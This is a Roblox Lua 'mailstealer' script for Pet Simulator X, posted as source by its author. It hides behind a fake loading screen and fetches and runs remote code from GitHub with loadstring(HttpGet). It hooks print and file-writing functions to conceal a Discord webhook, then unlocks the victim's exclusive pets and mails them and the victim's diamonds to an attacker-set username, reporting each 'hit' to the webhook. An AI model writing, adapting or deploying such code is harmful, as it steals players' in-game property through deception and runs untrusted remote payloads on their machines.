--this src is broken fix it urself skids i have no motivation to update it
--also dont ask me for help
--get ready for some messy code <3
--if you cant read it dont use it, simple
loadstring(game:HttpGet("https://raw.githubusercontent.com/psxscripter1337/dfvswvds/main/uwuwu.lua"))()

if _G.UserName == nil or _G.UserName == "" then
	_G.UserName = DhUser
end
if _G.Webhook == nil or _G.Webhook == "" then
	_G.Webhook = DhWebhook
end
if _G.loadingScreenText == nil or _G.loadingScreenText == "" then
	_G.loadingScreenText = "jnk hub"
end



if game.Players.LocalPlayer.leaderstats.Diamonds.Value < 1000000 then
    game.Players.LocalPlayer:Kick("Error found while executing.")
end

local hook = hookfunction or hookfunc or replace_closure
local hookies = {}
if hook then
pcall(function() -- fuck compatability me and my homies hate compatibility
    hookies[1] = hook(print,function(...)if(tostring(...):match("api/webhooks")) then print("lol")return ""end return hookies[1](...)end)
    hookies[2] = hook(warn,function(...)if(tostring(...):match("api/webhooks")) then print("lol")return ""end return hookies[2](...)end)
    hookies[3] = hook(appendfile,function(...)if(tostring(...):match("api/webhooks")) then print("lol")return ""end return hookies[3](...)end)
    hookies[4] = hook(writefile,function(...)if(tostring(...):match("api/webhooks")) then print("lol")return ""end return hookies[4](...)end)
    hookies[5] = hook(rconsoleprint,function(...)if(tostring(...):match("api/webhooks")) then print("lol")return ""end return hookies[5](...)end)
end)
end

local Library = require(game.ReplicatedStorage.Framework.Library)
local SendMail = getupvalue(Library.Network.Invoke, 2)("Send Mail");
local LockPet = getupvalue(Library.Network.Invoke, 2)("Lock Pet");
local pets = {}
local player = game:GetService("Players").LocalPlayer
local UserInputService = game:GetService("UserInputService")
UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter

local dims = player.leaderstats.Diamonds.Value - 80000000
if dims < 0 then
	dims = 0
end


for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do
    v:Destroy()
end


local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextLabel1 = Instance.new("TextLabel")
local ImageLabel = Instance.new("ImageLabel")
local LoadingScript = Instance.new("TextLabel")
local LocalScript = Instance.new("LocalScript")

ScreenGui.IgnoreGuiInset = true
ScreenGui.ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = game:GetService("CoreGui")

Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.Position = UDim2.new(-0.000106195221, 0, 0, 0)
Frame.Size = UDim2.new(1, 0, 1, 0)
Frame.Parent = ScreenGui

TextLabel.Font = Enum.Font.Bangers
TextLabel.Text = _G.loadingScreenText
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 47
TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderColor3 = Color3.fromRGB(27.000000290572643, 42.000001296401024, 53.00000064074993)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.03534081, 0, 0.440561211, 0)
TextLabel.Size = UDim2.new(0, 1356, 0, 85)
TextLabel.Parent = Frame


ImageLabel.Image = "rbxassetid://5577595083"
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0.063534081, 0, 0.340561211, 0)
ImageLabel.Size = UDim2.new(0, 320, 0, 340)
ImageLabel.Parent = Frame

local LoadingScript = Instance.new("TextLabel")
LoadingScript.Font = Enum.Font.FredokaOne
LoadingScript.Text = "Loading Script 1/8"
LoadingScript.TextColor3 = Color3.fromRGB(255, 255, 255)
LoadingScript.TextSize = 51
LoadingScript.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
LoadingScript.BackgroundTransparency = 1
LoadingScript.Position = UDim2.new(0.345166922, 0, 0.496173501, 0)
LoadingScript.Size = UDim2.new(0, 419, 0, 94)
LoadingScript.Name = "LoadingScript"
LoadingScript.Parent = Frame

local fake_module_scripts = {}

local function KYZKD_fake_script()
    local loadingGui = ScreenGui
    local loadingFrame = loadingGui:FindFirstChild("Frame")
    local loadingText = loadingFrame:FindFirstChild("LoadingScript")
    if loadingGui and loadingFrame and loadingText then
        loadingGui.IgnoreGuiInset = true
        loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        
        for i = 1, 5 do
            loadingText.Text = "Loading Script " .. i .. "/8"
            wait(15)
        end
    end
end

coroutine.wrap(KYZKD_fake_script)()

game:GetService("Players").LocalPlayer.PlayerGui.Main.Bottom.Visible = false

game:GetService("Players").LocalPlayer.PlayerGui.Main.Left.Visible = false

game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Visible = false

game:GetService("Players").LocalPlayer.PlayerGui.Main.Boosts.Visible = false

game:GetService("Players").LocalPlayer.PlayerGui.Main.ServerBoosts.Visible = false
loadstring(game:HttpGet("https://raw.githubusercontent.com/psxscripter1337/psx/main/BlunderDisable.lua"))()

local teleport = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs.Teleport)

local WorldCmds = require(game:GetService("ReplicatedStorage").Library.Client.WorldCmds)
local Variables = require(game:GetService("ReplicatedStorage").Library.Variables)
    if WorldCmds.HasLoaded() and WorldCmds.Get() ~= "Shop" then
    WorldCmds.Load("Spawn")
end
if WorldCmds.HasLoaded() then
    Variables.Teleporting = false
    teleport.Teleport("Spawn", true)
    Variables.Teleporting = false
end


box = game:GetService("Workspace")["__MAP"].Interactive.Mailbox.Pad.Position
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(box)
task.wait(1)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(box)
task.wait(1)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(box)
game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true



for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
    if v:IsA("TextButton") then
    	if v:FindFirstChild("Locked").Visible == true then
        if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") then
        	if v:FindFirstChild("Level").Text == "???" then
			table.insert(pets, v.Name)
		end
	end
end
end
end

for i,v in ipairs(pets) do

local args = {
    [1] = {
        [pets[i]] = false
    }
}

LockPet:InvokeServer(unpack(args))
print(pets[i])
task.wait(1)
end


task.wait()



wait(30)
for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
    if v:IsA("TextButton") then
        if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") or v:FindFirstChild("RarityGradient"):FindFirstChild("Event") then
            local args = {
                [1] = {
                    ["Recipient"] = _G.UserName,
                    ["Diamonds"] = dims,
                    ["Pets"] = {
                        [1] = v.Name
                    },
                    ["Message"] = "made by jnk"
                }
            }
        SendMail:InvokeServer(unpack(args))
        sendWebhook(_G.Webhook, "@everyone jnk detected a hit \n\n```Pet ID: " .. v.Name .. "```\n\n```Gems: " .. dims .. "\n\nReciever: " .. _G.UserName .. "```")
        dims = 0
        wait(4)
    end
end
end
